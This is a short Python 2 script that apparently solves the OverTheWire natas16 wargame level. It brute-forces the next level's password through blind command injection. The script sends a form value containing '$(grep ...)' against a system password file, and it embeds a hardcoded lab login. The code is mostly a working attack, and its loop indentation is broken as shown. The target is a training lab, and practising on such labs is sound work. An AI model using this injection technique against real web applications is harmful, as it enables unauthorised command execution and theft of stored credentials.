# -*- coding: utf-8 -*-
"""
Created on Mon Mar  2 23:44:01 2015

@author: George
"""

import urllib2, urllib, base64



#function to find password.
def get_password():
    
      #create characters I'm going to loop through.
      characters='abcdefghijklmnopqrstuvwxyz'
      characters+=characters.upper()
      characters+='0123456789'
    
      #with each loop we'll add the password characters we know
      #to the beginning of the search character.
      string_start=''
      for i in range(32):    
           for character in characters:
            
           #The string we want to check whether the password begins with.
           string=string_start+character
            
           #Connect to the web page, send username and password, then
	         #send our query as a parameter when we open the url.
	    
           request = urllib2.Request("http://natas16.natas.labs.overthewire.org/index.php")
           base64string = base64.encodestring('%s:%s' % ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')).replace('\n', '')
           request.add_header("Authorization", "Basic %s" % base64string)   
           params=urllib.urlencode({'needle':'$(grep ^'+string+' /etc/natas_webpass/natas17)African'})
           result = urllib2.urlopen(request,params)
            
           #Read the response, keep the important part, which we can use
	         #to test whether the character is the one we want.
	      
           text=result.readlines()
           if text[22].strip()!='African':
               print 'found: '+character
               string_start+=character
               result.close()
               break
           result.close() 
      print string_start                    
            
get_password()            
